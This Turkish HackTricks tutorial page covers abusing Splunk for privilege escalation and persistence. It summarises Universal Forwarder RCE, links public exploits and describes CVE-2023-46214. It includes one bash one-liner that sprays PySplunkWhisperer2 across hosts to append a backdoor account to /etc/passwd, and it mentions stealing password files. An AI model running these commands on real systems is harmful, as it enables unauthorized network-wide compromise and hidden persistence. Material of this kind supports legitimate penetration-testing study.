# Splunk LPE ve Kalıcılık

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

Bir makineyi **içeriden** veya **dışarıdan** **numaralandırırken** (port 8090) **Splunk çalışıyorsa**, şans eseri **geçerli kimlik bilgileri** biliyorsanız, Splunk hizmetini **kullanarak Splunk'ı çalıştıran kullanıcı olarak bir kabuk** çalıştırabilirsiniz. Eğer root çalışıyorsa, ayrıcalıkları root'a yükseltebilirsiniz.

Ayrıca, **zaten root kullanıcısıysanız ve Splunk hizmeti yalnızca localhost'ta dinlemiyorsa**, Splunk hizmetinden **parola** dosyasını **çalabilir** ve parolaları **kırmaya** veya **yeni kimlik bilgileri eklemeye** çalışabilirsiniz. Ve ana bilgisayarda kalıcılığı sürdürebilirsiniz.

Aşağıdaki ilk resimde, bir Splunkd web sayfasının nasıl göründüğünü görebilirsiniz.



## Splunk Universal Forwarder Agent Exploit Özeti

Daha fazla ayrıntı için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) gönderisine bakın. Bu sadece bir özet:

**Exploit Genel Bakış:**
Splunk Universal Forwarder Agent (UF) hedef alan bir exploit, ajan parolasına sahip saldırganların ajanı çalıştıran sistemlerde keyfi kod çalıştırmasına izin vererek, tüm bir ağı tehlikeye atabilir.

**Ana Noktalar:**
- UF ajanı, gelen bağlantıları veya kodun otantikliğini doğrulamaz, bu da yetkisiz kod çalıştırmasına karşı savunmasız hale getirir.
- Ortak parola edinme yöntemleri, ağ dizinlerinde, dosya paylaşımlarında veya iç belgelerde bulunmalarını içerir.
- Başarılı bir saldırı, kompromize edilen ana bilgisayarlarda SYSTEM veya root düzeyinde erişim, veri sızdırma ve daha fazla ağ sızma ile sonuçlanabilir.

**Exploit Yürütme:**
1. Saldırgan UF ajan parolasını elde eder.
2. Splunk API'sini kullanarak komut veya betikleri ajanlara gönderir.
3. Olası eylemler arasında dosya çıkarma, kullanıcı hesabı manipülasyonu ve sistem tehlikeye atma bulunur.

**Etki:**
- Her bir ana bilgisayarda SYSTEM/root düzeyinde izinlerle tam ağ tehlikeye atma.
- Algılanmayı önlemek için günlüğü devre dışı bırakma potansiyeli.
- Arka kapı veya fidye yazılımı kurulumu.

**Exploit için Örnek Komut:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Kullanılabilir halka açık zafiyetler:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Splunk Sorgularını Kötüye Kullanma

**Daha fazla ayrıntı için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) adresindeki yazıyı kontrol edin.**

**CVE-2023-46214**, bir **script**'in **`$SPLUNK_HOME/bin/scripts`** dizinine yüklenmesine izin veriyordu ve ardından **`|runshellscript script_name.sh`** arama sorgusu kullanarak orada depolanan **script**'in **çalıştırılabilmesini** açıkladı.


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>
